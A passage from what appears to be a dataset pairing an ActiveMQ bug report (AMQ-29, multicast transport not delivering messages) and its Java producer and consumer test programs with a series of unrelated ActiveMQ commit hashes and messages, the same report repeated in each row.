import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",51ef021073752f2cf8907fa0efdf8c93015dd77b,"https://issues.apache.org/activemq/browse/AMQ-2986 - JMX and store percent usage

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1023795 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",9e885efca2b4767528ce88e95bc2cc7b1dcd7ddf,"seems to be regression from: https://issues.apache.org/activemq/browse/AMQ-2970 - but there is some mix up with the creation of an admin connection context. having the BrokerView do the right thing works for the moment... but this needs some more eyes, test shows the issue when context is missing

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1026092 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",6ebc82c5c47e46479289b756514e0af44ff385b7,"https://issues.apache.org/activemq/browse/AMQ-2982 - sticky kahadb log files on rollback

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1027451 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",5edede1d0bae76510e42a16f8381570ad26fbfda,"partial fix for https://issues.apache.org/activemq/browse/AMQ-2939 - allow the management context port values to be properties by ensuring that their schema is of type string rather than integer

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1028278 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",ca668019a07ce817de0e6a9a882af9f1d06b3da3,"starter test case for https://issues.apache.org/activemq/browse/AMQ-2908 - it works though

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1031136 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",5ad72d650cce2d09881f4b7f0cf1eebdb79c4a7a,"https://issues.apache.org/jira/browse/AMQ-2981 - test case for discory uri with params

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1075407 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

::::::::::::::::::::::::::::::::::::
    Producer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageProducer;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Publisher
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQProducer
{
    protected ConnectionFactory connFactory;
    protected Connection sndConn;
    protected Session sndSess;
    protected MessageProducer producer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQProducer tester = new TestActiveMQProducer();

        tester.setUp();

        for (int i = 0; i < 100; i++) {
            Message msg = tester.sndSess.createTextMessage(""Hello World!"");
            tester.producer.send(tester.dest, msg);
            System.out.println(""Sent msg: "" + msg);
            Thread.sleep(1000);
        }
        
        tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");       
        System.out.println(""Created conn factory: "" + connFactory);
        
        sndConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + sndConn);
        
        sndSess = sndConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + sndSess);
        
        dest = sndSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );

        producer = sndSess.createProducer(dest);
        sndConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        sndSess.close();
        sndConn.close();
    }
}


::::::::::::::::::::::::::::::::::::
    Consumer tester
::::::::::::::::::::::::::::::::::::

import java.util.Properties;

import javax.jms.Connection;
import javax.jms.ConnectionFactory;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.Session;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;

import org.codehaus.activemq.ActiveMQConnectionFactory;
import org.codehaus.activemq.jndi.JNDIReferenceFactory;


/**
 * Class to test ActiveMQ Subscriber
 *
 * @author $author$
 * @version $Revision$
 */
public class TestActiveMQConsumer implements MessageListener
{
    protected ConnectionFactory connFactory;
    protected Connection rcvConn;
    protected Session rcvSess;
    protected MessageConsumer consumer;
    protected Destination dest;

    /**
     * main logic
     *
     * @param args .
     *
     * @throws Exception !
     */
    public static void main(String[] args) throws Exception
    {
        TestActiveMQConsumer tester = new TestActiveMQConsumer();

        tester.setUp();

        // tester.tearDown();
    }

    protected void setUp() throws Exception
    {
        connFactory = new ActiveMQConnectionFactory(""multicast://224.0.0.1:8000"");     
        //connFactory = new ActiveMQConnectionFactory(""tcp://127.0.0.1:61616"");     
        System.out.println(""Created conn factory: "" + connFactory);
   
        rcvConn = connFactory.createConnection();
        System.out.println(""Created conn: "" + rcvConn);
        
        rcvSess = rcvConn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        System.out.println(""Created receiveSession: "" + rcvSess);
        
        dest = rcvSess.createTopic(""FOO"");
        System.out.println( ""Created destination: "" + dest + "" of type: "" + dest.getClass() );
            
        consumer = rcvSess.createConsumer(dest);
        consumer.setMessageListener(this);
        rcvConn.start();
        
        System.out.println(""Started connections"");
    }

    protected void tearDown() throws Exception
    {
        rcvSess.close();
        rcvConn.close();
    }

    /**
     * Got a message!
     *
     * @param message .
     */
    public void onMessage(Message message)
    {
        System.out.println(""Received message: "" + message);
    }
}",4552896e9161e71d1b7d19ce5054960de129a9fe,"https://issues.apache.org/jira/browse/AMQ-2968 - make it work nicely in osgi

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1084613 13f79535-47bb-0310-9956-ffa450edef68"
12481344,AMQ-29,"I am trying to get a serverless setup using multicast or JRMP as transport.

I verified that Multicast works in my environment using this util: http://www.mikkle.dk/multicasttest/index.html

But I am unable to get ActiveMQ to work between 2 JVM on the same box or on different boxes.  Both producer and consumer runs without any error except that Consumer is not getting any message at all.  Furthermore, no multicast traffic can be detected on the network.

I have tried activemq-1.0-M1.jar and activemq-1.0-SNAPSHOT.jar as listed on http://dist.codehaus.org/activemq/jars and also several interim builds.

Attached are my 2 simple test program.  Note that I am able to get tcp protocol to work with these 2 program if I start a server.

